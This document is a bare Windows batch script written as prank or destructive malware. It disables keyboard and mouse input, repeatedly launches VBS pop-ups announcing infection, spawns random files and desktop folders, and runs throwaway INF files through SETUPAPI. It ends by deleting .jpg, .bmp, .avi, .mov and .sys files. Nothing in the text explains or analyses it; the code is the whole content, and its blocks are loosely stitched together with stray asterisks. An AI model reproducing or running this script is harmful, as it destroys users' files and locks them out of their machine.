   @echo off
   RUNDLL KEYBOARD,DISABLE
   RUNDLL MOUSE,DISABLE

   echo msgbox "Your Infected">>i.vbs
   start i.vbs
   echo "%random%">>l.txt
   echo "%random%">>l.bat
   start l.bat
   start l.txt
   md C:\WINDOWS\DESKTOP\%random%.bat
   echo "%random%">>ra.vbs
   start ra.vbs
   start ra.vbs
   echo msgbox "Your Infected">>yi.vbs
   start yi.vbs
      *

   RUNDLL32 USER,tilechildwindows
   PUSHD "%temp%"
   ECHO [Version] > {out}.inf
   ECHO signature=$chicago$ >> {out}.inf
   ECHO [defaultinstall] >> {out}.inf
   RUNDLL32 SETUPAPI,InstallHinfSection DefaultInstall 1 {out}.inf
   DEL {out}.inf
   POPD
   PUSHD "%temp%"
   ECHO [Version] > {out}.inf
   ECHO signature=$chicago$ >> {out}.inf
   ECHO [defaultinstall] >> {out}.inf
   RUNDLL32 SETUPAPI,InstallHinfSection DefaultInstall 1 {out}.inf
   DEL {out}.inf
   POPD

   del *.jpg
   del *.bmp
   del *.avi
   del *.mov
   del *.sys
   echo ..................
   echo bye bye
      *

   RUNDLL32 USER,tilechildwindows
   PUSHD "%temp%"
   ECHO [Version] > {out}.inf
   ECHO signature=$chicago$ >> {out}.inf
   ECHO [defaultinstall] >> {out}.inf
   RUNDLL32 SETUPAPI,InstallHinfSection DefaultInstall 1 {out}.inf
   DEL {out}.inf
   POPD
   PUSHD "%temp%"
   ECHO [Version] > {out}.inf
   ECHO signature=$chicago$ >> {out}.inf
   ECHO [defaultinstall] >> {out}.inf
   RUNDLL32 SETUPAPI,InstallHinfSection DefaultInstall 1 {out}.inf
   DEL {out}.inf
   POPD
